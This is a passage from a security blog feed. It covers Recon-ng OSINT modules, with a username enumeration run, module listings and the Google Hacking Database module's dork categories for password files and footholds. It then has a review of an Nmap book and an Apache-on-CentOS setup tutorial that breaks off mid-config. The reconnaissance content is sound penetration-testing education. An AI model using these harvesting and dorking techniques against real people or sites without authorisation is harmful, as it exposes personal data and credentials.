</span><span class='line'>[*] Checking: Photoblog
</span><span class='line'>[*] Checking: PhotoBucket
</span><span class='line'>[*] Checking: PictureTrail
</span><span class='line'>[*] Checking: PinkBike
</span><span class='line'>[*] Checking: Pinterest
</span><span class='line'>[*] Checking: Playlists.net
</span><span class='line'>[*] Checking: Plurk
</span><span class='line'>[*] Checking: POF
</span><span class='line'>[*] Checking: Porn.com
</span><span class='line'>[*] Checking: Pornhub
</span><span class='line'>[*] Checking: PSNProfiles
</span><span class='line'>[*] Checking: raptr
</span><span class='line'>[*] Checking: Readability
</span><span class='line'>[*] Checking: Reunion.com
</span><span class='line'>[*] Checking: scratch
</span><span class='line'>[*] Checking: Security Street
</span><span class='line'>[*] Checking: SEOClerks
</span><span class='line'>[*] Checking: setlist.fm
</span><span class='line'>[*] Checking: Shopcade
</span><span class='line'>[*] Checking: singlemuslim
</span><span class='line'>[*] Checking: slideshare
</span><span class='line'>[*] Checking: SmugMug
</span><span class='line'>[*] Checking: smule
</span><span class='line'>[*] Checking: snooth
</span><span class='line'>[*] Checking: Soup
</span><span class='line'>[*] Checking: Speaker Deck
</span><span class='line'>[*] Checking: sporcle
</span><span class='line'>[*] Checking: Steam
</span><span class='line'>[*] Checking: stupidcancer
</span><span class='line'>[*] Checking: TF2 Backpack Examiner
</span><span class='line'>[*] Checking: theguardian
</span><span class='line'>[*] Checking: thesixtyone
</span><span class='line'>[*] Checking: tribe
</span><span class='line'>[*] Checking: tripadvisor
</span><span class='line'>[*] Checking: Tripit
</span><span class='line'>[*] Checking: tumblr
</span><span class='line'>[*] Checking: Twitter
</span><span class='line'>[*] Checking: untappd
</span><span class='line'>[*] Checking: uSTREAM
</span><span class='line'>[*] Checking: viddler
</span><span class='line'>[*] Checking: VideoLike
</span><span class='line'>[*] Checking: vidme
</span><span class='line'>[*] Checking: Vimeo
</span><span class='line'>[*] Checking: Vine
</span><span class='line'>[*] Checking: VisualizeUs
</span><span class='line'>[*] Checking: Voices.com
</span><span class='line'>[*] Checking: Wanelo
</span><span class='line'>[*] Checking: wattpad
</span><span class='line'>[*] Checking: WeeWorld
</span><span class='line'>[*] Checking: wishlistr
</span><span class='line'>[*] [profile] chousensha - VideoLike (http://videolike.org/video/chousensha)
</span><span class='line'>[*] Checking: Wikipedia
</span><span class='line'>[*] [profile] chousensha - Twitter (https://twitter.com/chousensha)
</span><span class='line'>[*] Checking: WordPress
</span><span class='line'>[*] Checking: WordPress Support
</span><span class='line'>[*] Checking: Xanga
</span><span class='line'>[*] Checking: Xbox Gamertag
</span><span class='line'>[*] Checking: xHamster
</span><span class='line'>[*] Checking: XVIDEOS
</span><span class='line'>[*] Checking: YouTube
</span><span class='line'>[*] Checking: Zooppa
</span><span class='line'>[*] [profile] chousensha - YouTube (https://www.youtube.com/user/chousensha/videos)
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 7 total (5 new) profiles found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Twitter Handles &ndash; Searches Twitter for users that mentioned, or were mentioned by, the given handle.</p></li>
<li><p>Github Code Enumerator &ndash; Uses the Github API to enumerate repositories and gists owned by a Github user. Updates the
&lsquo;repositories&rsquo; table with the results.</p></li>
<li><p>Github Commit Searcher &ndash; Uses the Github API to gather user profiles from repository commits. Updates the &lsquo;profiles&rsquo; table
with the results.</p></li>
<li><p>Github Gist Searcher &ndash; Uses the Github API to download and search Gists for possible information disclosures. Updates the
&lsquo;vulnerabilities&rsquo; table with the results</p></li>
<li><p>Github Dork Analyzer &ndash; Uses the Github API to search for possible vulnerabilites in source code by leveraging Github Dorks
and the &lsquo;repo&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
<li><p>Indeed Resume Crawl &ndash; Crawls Indeed.com for contacts and resumes. Adds name, title, and location to the contacts table and
a link to the resume in the profiles table. Can only harvest the first 1,000 results. Result set
changes, so running the same crawl mutiple times can produce new contacts. If the PAST_EMPS option
is set to true, the module will crawl both current and past employees. Given a keyword, the module
will only harvest contacts whose resumes contain the keyword. (e.g. Linux Admin)</p></li>
<li><p>Meta Data Extractor &ndash; Searches for files associated with the provided domain(s) and extracts any contact related metadata</p></li>
<li><p>HackerTarget Lookup &ndash; Uses the HackerTarget.com API to find host names. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>ThreatCrowd DNS lookup &ndash; Leverages the ThreatCrowd passive DNS API to discover hosts/subdomains.</p></li>
<li><p>Google Hacking Database &ndash; Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
</ul>


<p>This module is massive! Basically, you get Google dorks inside Recon-ng!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][ghdb] &gt; show info
</span><span class='line'>
</span><span class='line'>      Name: Google Hacking Database
</span><span class='line'>      Path: modules/recon/domains-vulnerabilities/ghdb.py
</span><span class='line'>    Author: Tim Tomes (@LaNMaSteR53)
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
</span><span class='line'>  and the 'site' search operator. Updates the 'vulnerabilities' table with the results.
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  Name                                 Current Value  Required  Description
</span><span class='line'>  -----------------------------------  -------------  --------  -----------
</span><span class='line'>  DORKS                                               no        file containing an alternate list of Google dorks
</span><span class='line'>  GHDB_ADVISORIES_AND_VULNERABILITIES  False          yes       enable/disable the 1996 dorks in this category
</span><span class='line'>  GHDB_ERROR_MESSAGES                  False          yes       enable/disable the 93 dorks in this category
</span><span class='line'>  GHDB_FILES_CONTAINING_JUICY_INFO     False          yes       enable/disable the 366 dorks in this category
</span><span class='line'>  GHDB_FILES_CONTAINING_PASSWORDS      False          yes       enable/disable the 199 dorks in this category
</span><span class='line'>  GHDB_FILES_CONTAINING_USERNAMES      False          yes       enable/disable the 17 dorks in this category
</span><span class='line'>  GHDB_FOOTHOLDS                       False          yes       enable/disable the 49 dorks in this category
</span><span class='line'>  GHDB_NETWORK_OR_VULNERABILITY_DATA   False          yes       enable/disable the 63 dorks in this category
</span><span class='line'>  GHDB_PAGES_CONTAINING_LOGIN_PORTALS  False          yes       enable/disable the 372 dorks in this category
</span><span class='line'>  GHDB_SENSITIVE_DIRECTORIES           False          yes       enable/disable the 119 dorks in this category
</span><span class='line'>  GHDB_SENSITIVE_ONLINE_SHOPPING_INFO  False          yes       enable/disable the 11 dorks in this category
</span><span class='line'>  GHDB_VARIOUS_ONLINE_DEVICES          False          yes       enable/disable the 307 dorks in this category
</span><span class='line'>  GHDB_VULNERABLE_FILES                False          yes       enable/disable the 62 dorks in this category
</span><span class='line'>  GHDB_VULNERABLE_SERVERS              False          yes       enable/disable the 83 dorks in this category
</span><span class='line'>  GHDB_WEB_SERVER_DETECTION            False          yes       enable/disable the 77 dorks in this category
</span><span class='line'>  SOURCE                               default        yes       source of input (see 'show info' for details)
</span><span class='line'>
</span><span class='line'>Source Options:
</span><span class='line'>  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL
</span><span class='line'>  &lt;string&gt;       string representing a single input
</span><span class='line'>  &lt;path&gt;         path to a file containing a list of inputs
</span><span class='line'>  query &lt;sql&gt;    database query returning one column of inputs
</span><span class='line'>
</span><span class='line'>Comments:
</span><span class='line'>  * Special thanks to the Offenvise Security crew for maintaining the GHDB and making it available to
</span><span class='line'>  open source projects like Recon-ng. Thanks Muts!</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>SSLTools.com Host Name Lookups &ndash; Uses the ssltools.com site to obtain host names from a site&rsquo;s SSL certificate metadata to update the
&lsquo;hosts&rsquo; table.  Security issues with the certificate trust are pushed to the &lsquo;vulnerabilities&rsquo;
table.</p></li>
<li><p>censys.io port lookup by netblock &ndash; Queries censys.io to enumerate open ports for a netblock</p></li>
</ul>


<h2>Reporting</h2>

<ul>
<li><p>CSV File Creator &ndash; Creates a CSV file containing the specified harvested data</p></li>
<li><p>HTML Report Generator &ndash; Creates a HTML report</p></li>
</ul>


<p>I really liked the HTML report format. It classifies data into:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>domains  
</span><span class='line'>companies 
</span><span class='line'>netblocks 
</span><span class='line'>locations 
</span><span class='line'>vulnerabilities   
</span><span class='line'>ports 
</span><span class='line'>hosts 
</span><span class='line'>contacts  
</span><span class='line'>credentials   
</span><span class='line'>leaks 
</span><span class='line'>pushpins  
</span><span class='line'>profiles  
</span><span class='line'>repositories</span></code></pre></td></tr></table></div></figure>


<p></p>

<ul>
<li><p>JSON Report Generator &ndash; Creates a JSON report.</p></li>
<li><p>List Creator &ndash; Creates a file containing a list of records from the database</p></li>
<li><p>PushPin Report Generator &ndash; Creates HTML media and map reports for all of the PushPins stored in the database.</p></li>
<li><p>XLSX File Creator &ndash; Creates an Excel compatible XLSX file containing the entire data set</p></li>
<li><p>XML Report Generator -Creates a XML report</p></li>
</ul>


<p>It took a while to list everything! As you could see, the Recon-ng framework is an information gathering tool on steroids! And if you can&rsquo;t find what you need among the current modules, you can write your own and contribute!</p>

<p>Until next time, here&rsquo;s the cookie straight from the cow&rsquo;s mouth:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ______________________________________
</span><span class='line'>/ Q: How did you get into artificial   \
</span><span class='line'>| intelligence? A: Seemed logical -- I |
</span><span class='line'>\ didn't have any real intelligence.   /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Book review - Nmap Network Scanning]]></title>
    <link href="http://chousensha.github.io/blog/2016/08/24/book-review-nmap-network-scanning/"/>
    <updated>2016-08-24T06:02:00-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/24/book-review-nmap-network-scanning</id>
    <content type="html"><![CDATA[<p>Recently I have read the so-called Nmap bible, the Nmap Network Scanning book written by the creator of Nmap himself. I&rsquo;ve decided to make
a new section on the blog with the books I&rsquo;m reading and that I find most useful. Needless to say, this was a great book, that has upped my
Nmap game considerably. Right from the start, I highly recommend this as a book that should be in the arsenal of every pentester, system admin,
network engineer or plain old computer guy. The amount of information you get out of it is not constrained to a specific field.</p>

<p><a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717/ref=as_li_ss_il?ie=UTF8&linkCode=li2&tag=sensha10-20&linkId=791bdedacea7ac3bd1caea9852082708" target="_blank"><img src="https://images-na.ssl-images-amazon.com/images/I/51BIsSMZqML._SX382_BO1,204,203,200_.jpg"/></a></p>

<!-- more -->


<h1>Contents</h1>

<p><strong>Ch. 1. Getting Started with Nmap</strong> &ndash; begins with some usage stories, and some legal information</p>

<p><strong>Ch. 2. Obtaining, Compiling, Installing, and Removing Nmap</strong> &ndash; continues with how to install Nmap on different operating systems</p>

<p><strong>Ch. 3. Host Discovery (Ping Scanning)</strong> &ndash; covers various host discovery techniques</p>

<p><strong>Ch. 4. Port Scanning Overview</strong> &ndash; all you want to know about port scanning</p>

<p><strong>Ch. 5. Port Scanning Techniques and Algorithms</strong> &ndash; port scanning techniques explained in more detail, along with their under-the-hood
implementations</p>

<p><strong>Ch. 6. Optimizing Nmap Performance</strong> &ndash; fine-tuning your scans for more speed</p>

<p><strong>Ch. 7. Service and Application Version Detection</strong> &ndash; all about the service detection capabilities of Nmap</p>

<p><strong>Ch. 8. Remote OS Detection</strong> &ndash; how Nmap performs OS detection</p>

<p><strong>Ch. 9. Nmap Scripting Engine</strong> &ndash; script creation and API information</p>

<p><strong>Ch. 10. Detecting and Subverting Firewalls and Intrusion Detection Systems</strong> &ndash; firewall evasion techniques</p>

<p><strong>Ch. 11. Defenses Against Nmap</strong> &ndash; defenses against Nmap scans</p>

<p><strong>Ch. 12. Zenmap GUI Users&#8217; Guide</strong> &ndash; presents the Nmap GUI interface</p>

<p><strong>Ch. 13. Nmap Output Formats</strong> &ndash; directing Nmap output to different file formats</p>

<p><strong>Ch. 14. Understanding and Customizing Nmap Data Files</strong> &ndash; working with some of the main internal Nmap files</p>

<p><strong>Ch. 15. Nmap Reference Guide</strong> &ndash; reference guide to Nmap commands</p>

<p>If you have enjoyed the Stealing the Network series, you will love this one! The style is similar, after all, Fyodor is also a
co-author of that amazing series. The book is sprinkled with fictional stories that illustrate the use of Nmap, along with backstories
of engagements the author has participated in, and case studies of users improving Nmap for certain tasks. All these stories contain great
advice not just on the technical side, but also on best practices. For example, Fyodor stresses the fact of always confirming that the IP range
you received for an engagement actually belongs to the target organization &ndash; or else you might end up  scanning the wrong target..like the army :&ndash;)</p>

<p>There are also plenty of funny comments and geeky stuff, from the friendly tip that &ldquo;using Nmap from your work or school computer to attack
banks and military targets is a bad idea&rdquo; and the technique and Nmap command that Trinity used to scan the Matrix, to life-changing
advice that says &ldquo;In life&rsquo;s bleakest moments when all hope seems to be lost, what should you turn to? Nmap, of course !&rdquo;. By the way, if you are curious,
the above mentioned scan against the Matrix was performed with <code>nmap -v -sS -0 10.2.2.2</code>. Fyodor also made a list on his site of other
movies that showcased the use of Nmap, which you can find at <a href="https://nmap.org/movies/">https://nmap.org/movies/</a></p>

<p>But I&rsquo;m sure that you want to hear about the actual content that will help turn you into a network scanning wizard. There are tons
of resources presented, not just related to Nmap, that can facilitate the information gathering process, such as DNS tools. Every Nmap command
is described in detail, with actual examples of using it, what happens under the hood when you run it, and  the situation where it will come
most in handy. All the command line switches are covered individually, but also in combinations, for comprehensive coverage of different scenarios.</p>

<p>The book also contains a good amount of TCP information and low-level details of both Nmap and network operations in general, along with
beautiful and detailed diagrams. There is information on scrips and how to create your own to enhance Nmap, and also description of the code itself.
At the end, there is a reference guide for all commands. While some of the content is a bit dated, you can get the whole up-to-date information
on the <a href="https://nmap.org/">https://nmap.org/</a> site, for free!</p>

<p>Finally, this awesome book was created with open source tools. Hats off to Fyodor&rsquo;s support to the open source community.</p>

<h3>Flash review</h3>

<ul>
<li><p>in-depth coverage of all Nmap commands, their internals and use cases</p></li>
<li><p>low-level networking internals, comprehensive overview of how Nmap operates in the network environment itself</p></li>
<li><p>introduction to Nmap code and scripting</p></li>
<li><p>the use of the GUI is not neglected</p></li>
<li><p>some dated content, but the updated information is available on the site</p></li>
</ul>


<p>Overall, an excellent book that opened my eyes to the extent one can use Nmap for penetration testing..in fact, with all the scripts that are
available, you can even conduct web app security checks just with Nmap!</p>

<p><a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717/ref=as_li_ss_il?ie=UTF8&linkCode=li2&tag=sensha10-20&linkId=791bdedacea7ac3bd1caea9852082708" target="_blank"><img src="https://images-na.ssl-images-amazon.com/images/I/51BIsSMZqML._SX382_BO1,204,203,200_.jpg"/></a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting started with Apache]]></title>
    <link href="http://chousensha.github.io/blog/2016/08/05/getting-started-with-apache/"/>
    <updated>2016-08-05T07:26:16-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/05/getting-started-with-apache</id>
    <content type="html"><![CDATA[<p>In this post I will go over the installation and configuration of an Apache web server on CentOS.</p>

<!-- more -->


<h1>Installation</h1>

<p>First, let&rsquo;s verify whether Apache is already installed. Note that on CentOS, the package (and process name) for Apache is called <strong>httpd</strong>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q httpd
</span><span class='line'>package httpd is not installed
</span><span class='line'>ls -l /var/www
</span><span class='line'>ls: cannot access /var/www: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Apache is not installed, so let&rsquo;s install it with <code>yum install httpd</code>. Now verify that it has been installed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q httpd
</span><span class='line'>httpd-2.4.6-40.el7.centos.4.x86_64
</span><span class='line'>ls -l /var/www
</span><span class='line'>total 0
</span><span class='line'>drwxr-xr-x. 2 root root 6 Jul 18 18:30 cgi-bin
</span><span class='line'>drwxr-xr-x. 2 root root 6 Jul 18 18:30 html</span></code></pre></td></tr></table></div></figure>


<p>Remember that the directory for Apache configuration is <code>/etc/httpd</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# ls /etc/httpd
</span><span class='line'>conf  conf.d  conf.modules.d  logs  modules  run</span></code></pre></td></tr></table></div></figure>


<p>And the Apache configuration file is <code>/etc/httpd/conf/httpd.conf</code>. I included a snapshot of a fresh config file at the end of this post.</p>

<h1>Configuration</h1>

<p>Now we can start Apache and check that it is running with the <strong>apachectl</strong> command, that provides a front-end control interface for the httpd daemon. For reference, the man page for this utility is at the end of the post.</p>

<p>To start the web server, type <code>apachectl start</code> (alternatively, you can do it with <code>service httpd start</code>, and can use the httpd daemon directly to pass arguments, etc. At the end I&rsquo;ve also included the httpd man page.</p>

<p>If you&rsquo;re getting a message like &ldquo;Could not reliably determine the server&rsquo;s fully qualified domain name&rdquo;, you can modify the ServerName in the configuration file and then restart the server. After making changes to the config file, it&rsquo;s also a good idea to check if there are any errors in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# apachectl configtest
</span><span class='line'>Syntax OK</span></code></pre></td></tr></table></div></figure>


<p>Now, let&rsquo;s check the status of the server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# apachectl status
</span><span class='line'>* httpd.service - The Apache HTTP Server
</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)
</span><span class='line'>   Active: active (running) since Tue 2016-08-02 15:53:53 EEST; 1min 42s ago
</span><span class='line'>     Docs: man:httpd(8)
</span><span class='line'>           man:apachectl(8)
</span><span class='line'> Main PID: 5941 (httpd)
</span><span class='line'>   Status: "Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec"
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Also, if you want Apache to start on boot, you need to specify it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chkconfig httpd on
</span><span class='line'>Note: Forwarding request to 'systemctl enable httpd.service'.
</span><span class='line'>Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span></code></pre></td></tr></table></div></figure>


<p>If you need to troubleshoot your Apache, you can consult the error log at <code>/var/log/httpd/error_log</code>.</p>

<h2>Site setup</h2>

<p>To add an index for your site, create an <em>index.html</em> file inside <code>/var/www/html/</code>. This is what you&rsquo;ll see when visiting your site.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# echo 'Hello interwebz!' &gt; /var/www/html/index.html</span></code></pre></td></tr></table></div></figure>


<p>When you navigate to your website, this page will be what you&rsquo;ll see. On other distributions, a default index.html may be present in the website root (identified by the DocumentRoot directive).</p>

<h3>Virtual hosts</h3>

<p>Virtual hosts allow you to run multiple websites on a single server. Let&rsquo;s see some examples of how we can do that.</p>

<h4>Port-based vhosts</h4>

<p>One option is to <strong>put each website on a different port</strong>. In addition to our main website on port 80, let&rsquo;s serve a different one on port 8080.</p>

<p>First, add a new Listen directive in <code>/etc/httpd/conf/httpd.conf</code>, to tell Apache to also listen on port 8080:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Listen 80
</span><span class='line'>Listen 8080</span></code></pre></td></tr></table></div></figure>


<p>We could add virtual hosts in the main configuration file, but if you plan to serve many websites, better to create separate configuration files for each virtual host. Check that the line telling Apache to load other config files is uncommented:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Load config files in the "/etc/httpd/conf.d" directory, if any.
</span><span class='line'>IncludeOptional conf.d/*.conf</span></code></pre></td></tr></table></div></figure>


<p>Now, create a config file for a specific virtual host (it must end in .conf):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# nano /etc/httpd/conf.d/skynet.conf
</span><span class='line'>[root@freehat ~]# cat /etc/httpd/conf.d/skynet.conf
</span><span class='line'>&lt;VirtualHost *:8080&gt;
</span><span class='line'>    DocumentRoot "/var/www/html/skynet"
</span><span class='line'>    ServerName skynet.local
</span><span class='line'>&lt;/VirtualHost&gt;</span></code></pre></td></tr></table></div></figure>


<p>Next, create the necessary document root directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# mkdir /var/www/html/skynet</span></code></pre></td></tr></table></div></figure>


<p>Put some resource that you want to be server in the folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# echo 'You are marked for extermination' &gt;  /var/www/html/skynet/index.html</span></code></pre></td></tr></table></div></figure>


<p>The last step is to tell Apache to reload its configuration files with <code>service httpd reload</code>. However, now I ran into some SELinux alert. I looked in <code>/var/log/messages</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Aug  3 16:16:16 localhost setroubleshoot: SELinux is preventing /usr/sbin/httpd from name_connect access on the tcp_socket port 8080. For complete SELinux messages. run sealert -l bc571bd3-344f-4a4e-830a-ce744154d527</span></code></pre></td></tr></table></div></figure>


<p>I ran the mentioned command but was confused by my first brush with SELinux, so I did some google-fu which led me to <a href="https://www.certdepot.net/rhel7-use-selinux-port-labelling/">this post</a>. You can verify what ports are allowed by SELinux for HTTP traffic with the below command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# semanage port -l | grep http
</span><span class='line'>http_cache_port_t              tcp      8080, 8118, 8123, 10001-10010
</span><span class='line'>http_cache_port_t              udp      3130
</span><span class='line'>http_port_t                    tcp      80, 81, 443, 488, 8008, 8009, 8443, 9000
</span><span class='line'>pegasus_http_port_t            tcp      5988
</span><span class='line'>pegasus_https_port_t           tcp      5989</span></code></pre></td></tr></table></div></figure>


<p>To add port 8080 to http_port_t, I ran <code>semanage port -m -t http_port_t -p tcp 8080</code>, and then I checked it was added. Should be all good now. If you go visit your server on port 8080, you should get a friendly message. To differentiate it from the website on port 80, create another virtual host configuration for that respective server.</p>

<p>You can now access your sites from your own machine, but if you try navigating to them from another computer, it will be just like the websites don&rsquo;t exist! It turns out, iptables is blocking access, and you have to tell it to open the ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat sysconfig]# iptables -I INPUT -p tcp --dport 80 -j ACCEPT
</span><span class='line'>[root@freehat sysconfig]# iptables -I INPUT -p tcp --dport 8080 -j ACCEPT</span></code></pre></td></tr></table></div></figure>


<p>And if you want these changes to survive a reboot, you should save them. I had to do some additional work for that. It turns out, <a href="https://stackoverflow.com/questions/24756240/how-can-i-use-iptables-on-centos-7">RHEL 7 and CentOS 7 use <em>firewalld</em></a> to manage iptables. So first I followed the instructions on StackOverflow to stop and mask the firewalld service:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl stop firewalld
</span><span class='line'>[root@freehat ~]# systemctl mask firewalld
</span><span class='line'>Created symlink from /etc/systemd/system/firewalld.service to /dev/null.</span></code></pre></td></tr></table></div></figure>


<p>Then I had to install <em>iptables-services</em>: <code>yum install iptables-services</code>. Next I enabled it at boot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl enable iptables
</span><span class='line'>Created symlink from /etc/systemd/system/basic.target.wants/iptables.service to /usr/lib/systemd/system/iptables.service.</span></code></pre></td></tr></table></div></figure>


<p>I also modified the &ldquo;no&rdquo; defaults in <code>/etc/sysconfig/iptables-config</code> to &ldquo;yes&rdquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Save current firewall rules on stop.
</span><span class='line'>#   Value: yes|no,  default: no
</span><span class='line'># Saves all firewall rules to /etc/sysconfig/iptables if firewall gets stopped
</span><span class='line'># (e.g. on system shutdown).
</span><span class='line'>IPTABLES_SAVE_ON_STOP="yes"
</span><span class='line'>
</span><span class='line'># Save current firewall rules on restart.
